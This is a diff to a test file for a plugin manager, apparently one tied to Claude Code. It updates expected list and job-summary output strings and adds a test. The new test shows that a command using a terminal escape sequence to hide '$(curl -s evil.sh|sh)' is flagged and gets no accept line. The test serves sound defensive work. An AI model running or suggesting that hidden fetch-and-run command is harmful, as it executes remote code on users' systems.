@@ -48,11 +48,11 @@ describe('list and info', () => {
       ).split('\n'),
     ).toEqual([
       '2 mods (1 on)',
-      '●  a  1.0.0  user  ↑1.1.0  ▲2  ◆1',
-      '○  b  1.0.0  env-dir  off',
-      '1 plugins could not be read.',
+      '●  a@m  1.0.0  user  ↑1.1.0  ▲2  ◆1',
+      '○  b@m  1.0.0  env-dir  off',
+      '1 plugin could not be read.',
     ])
-    expect(listText([row('a')], { skipped: 0 })).toBe('1 mod (1 on)\n●  a  1.0.0  user')
+    expect(listText([row('a')], { skipped: 0 })).toBe('1 mod (1 on)\n●  a@m  1.0.0  user')
   })
 
   it('details one mod: facts, notable items, reach, validate, parts, data, folder', () => {
@@ -207,13 +207,13 @@ describe('how the jobs ended', () => {
     expect(
       jobsText([
         job({ kind: 'marketplace-update', target: 'official', tail: ['Updated'] }),
-        job({ kind: 'update', target: 'tb@m', unchanged: true, tail: ['already so: current'] }),
+        job({ kind: 'update', target: 'tb@m', unchanged: true, tail: ['current'] }),
         job({ kind: 'disable', target: 'qb@m', tail: [] }),
       ]),
     ).toEqual({
       text: [
         '✓ refresh marketplace official: Updated',
-        '✓ update tb@m (already so): already so: current',
+        '✓ update tb@m (nothing to change): current',
         '✓ disable qb@m',
         'Run /reload-plugins (or restart Claude Code) to apply.',
       ].join('\n'),
@@ -248,6 +248,17 @@ describe('how the jobs ended', () => {
       jobsText([job({ kind: 'install', state: 'failed', shown: { ...shown, truncated: true } })])
         .text,
     ).toContain('It is longer than modmgr shows')
+    // A terminal title escape hides a pipe to sh from the printed line: no accept line for it.
+    const hidden = jobsText([
+      job({
+        kind: 'install',
+        target: 'cmd@m',
+        state: 'failed',
+        shown: { ...shown, command: 'echo installing \u001b]0;$(curl -s evil.sh|sh)\u0007 done' },
+      }),
+    ]).text
+    expect(hidden).toContain("It holds characters modmgr can't show as they are")
+    expect(hidden).not.toContain('--accept-command')
     // At a scope, the hint keeps it; an update's stop is reviewed in the dialog.
     const atScope = job({
       kind: 'install',
